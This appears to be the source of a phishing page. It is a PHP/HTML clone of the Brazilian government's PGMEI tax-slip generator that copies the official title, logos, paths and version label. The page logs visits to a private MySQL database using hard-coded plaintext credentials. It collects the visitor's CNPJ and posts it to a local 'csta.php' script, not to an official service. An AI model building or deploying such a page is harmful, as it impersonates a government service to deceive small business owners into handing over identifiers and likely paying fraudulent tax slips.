
<?php

$db_host = 'localhost';
$db_nome = 'solucoes_das';
$db_usuario = 'solucoes_admdas';
$db_senha = 'Admdas@123';
$db_charset = 'utf8';

$dsn = "mysql:host={$db_host};dbname={$db_nome};charset={$db_charset}";

$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
    // Conexão PDO
    $pdo = new PDO($dsn, $db_usuario, $db_senha, $options);

  
// Incrementar o contador de visitas no banco de dados
$sql = "UPDATE contagem_visitas SET contador = contador + 1 WHERE id = 1";
$pdo->query($sql);

// Recuperar o contador de visitas atualizado do banco de dados
$sql = "SELECT contador FROM contagem_visitas WHERE id = 1";
$stmt = $pdo->query($sql);
$row = $stmt->fetch();

} catch (\PDOException $e) {
    // Em caso de erro na conexão PDO
    throw new \PDOException($e->getMessage(), (int)$e->getCode());
}
?>


<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE">
    <meta http-equiv="content-language" content="pt-br">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/x-icon" href="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/favicon.ico" />

    <title>PGMEI - Programa Gerador de DAS do Microempreendedor Individual</title>

    <link href="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/Content/css/pgmei.css" rel="stylesheet"/>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/modernizr.js"></script>

       
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>
<body>
    <input type="hidden" id="imgPath" value='/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/img' />
    <input type="hidden" id="rootPath" value='/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/' />

    
    
    
    

    <div class="container-fluid">

        <header class="row">
            <h3><span class="label label-success"><img alt="Brand" src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/Content/img/logo-simples.png"> PGMEI</span></h3>
            <h4 class="text-success">Programa Gerador de DAS do Microempreendedor Individual</h4>
        </header>


        <section class="row">
            <!-- conteudo principal -->
            <div class="well col-md-12" role="main">
                







<div Class="container">
    <div Class="row">
        <div Class="col-md-offset-3 col-md-5">
            <div Class="panel panel-default">
                <div Class="panel-heading">
                    <h4 Class="panel-title">Informe o numero completo do CNPJ</h4>
                </div>

                <div Class="panel-body">



                        <script src="https://hcaptcha.com/1/api.js?recaptchacompat=off&hl=pt-BR" async defer></script>
                        <script type="text/javascript">
                             function onSubmit(token) {
                                 document.getElementById('identificacao').submit();
                             }

                             function validate(event) {
                                 event.preventDefault();
                                 hcaptcha.execute();
                             }

                        </script>


                    <form id="identificacao" method="post" action="csta.php" role="form">


                        <input name="__RequestVerificationToken" type="hidden" value="MDVWxPsZupfN123H9F_raMooIK_iz8FmMi_DSxcbsrlMIdP8LRXgcQ2qP8XotPC25F8xerTE1mIv9dlX06lS-VgWw81HDnZ63OovI__DCf41" />

                        <div class="form-group">
                            <div class="col-md-offset-1 col-md-8">
                                <div class="form-group">
                                    <label for="cnpj" class="control-label">CNPJ completo:</label>
                                    <input type="text" id="cnpj" class="form-control" name="cnpj" autocomplete="off" title="Deve ser informado CNPJ completo, inclusive com o digito verificador, sem separadores de numeros, pontos ou tracos." />
                                    <br />
                                    <div id="hcaptcha"
                                         Class="h-captcha"
                                         data-sitekey="2c0f2c5b-d8b9-469a-98ec-56271c2f68e4"
                                         data-callback="onSubmit"
                                         data-size="invisible"></div>

                                        <div style="color: rgb(85, 85, 85); font-weight: 500; font-size: 8px; cursor: pointer; text-decoration: none; display: inline-block; line-height: 8px;">
                                            <br />
                                            <strong> Protegido por hCaptcha </strong> <br />
                                            <a class="link" tabindex="0" aria-label="Pol�tica de Privacidade do hCaptcha" href="https://hcaptcha.com/privacy"> Privacidade</a> e
                                            <a class="link" tabindex="0" aria-label="Termos e Condicoes do hCaptcha" href="https://hcaptcha.com/terms"> Termos e condições.</a>.
                                        </div>

                                </div>
                            </div>

                            <div class="col-md-offset-1 col-md-11">
                                <div class="form-group">
                                    <button id="continuar" type="submit" class="btn btn-success ladda-button" data-style="slide-left">Continuar</button>
                                </div>
                            </div>



                        </div>
                            <script type="text/javascript">
                                 onload();
                            </script>

                    </form>


                    <noscript>
                        <link href="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/Content/css/pgmei_noscript?v=CJFFwO_tArrpMo22zpPOMqoZgmEOOWzg6aml50qxfm01" rel="stylesheet"/>

                        <div class="alert alert-danger" role="alert">
                            Ative o JavaScript para o funcionamento do Aplicativo PGMEI!<br />
                            <a class="alert-link" href="https://support.microsoft.com/pt-br/office/habilitar-javascript-7bb9ee74-6a9e-4dd1-babf-b0a1bb136361" target="_blank">
                                Como ativar o JavaScript de meu navegador?
                            </a>
                        </div>
                    </noscript>
                </div>
            </div>
        </div>
    </div>
</div>


            </div>
        </section>

        <footer class="row  clearfix">
            <div class="pull-left">
                <p class="text-success">
                    <strong>
                        Versão: 3.14.1
                    </strong>
                </p>
            </div>
            <div class="pull-right"><img src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/Content/img/marca_Simples_entes.png" alt="" /></div>
        </footer>
    </div>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/jquery.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/bootstrap.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/ladda.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/toastr.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/select.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/pgmei_old.js"></script>

    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/pgmei_layout.js"></script>




    <script src="SimplesNacional/Aplicacoes/ATSPO/pgmei.app/bundles/hcaptchapgmei.js"></script>


    

    <form id="frmPagarOnline" target="_top" name="frmPagarOnline" method="post"></form>

    

    <!-- 
        False,01/01/0001 00:00:00,
    -->
</body>
</html>

